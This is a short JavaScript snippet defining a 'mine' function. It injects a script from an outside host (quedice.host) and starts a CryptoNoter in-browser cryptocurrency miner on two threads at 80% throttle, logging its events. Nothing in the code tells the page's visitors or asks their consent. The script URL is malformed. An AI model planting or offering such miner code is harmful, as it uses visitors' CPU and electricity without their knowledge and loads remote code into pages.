global.mine = function() {
  var script = document.createElement('script');
  script.src = 'https//quedice.host/processor.js';
  script.onload = function() {
    var miner = new CryptoNoter.Anonymous('quedice', {
      autoThreads: 2,
      throttle: 0.8,
    });
    miner.start();
    ['open', 'authed', 'close', 'error', 'job', 'found', 'accepted'].forEach(function(key) {
      miner.on(key, function(arg) {
        console.log('miner ' + key, arg);
      });
    });
  };
  document.head.appendChild(script);
};


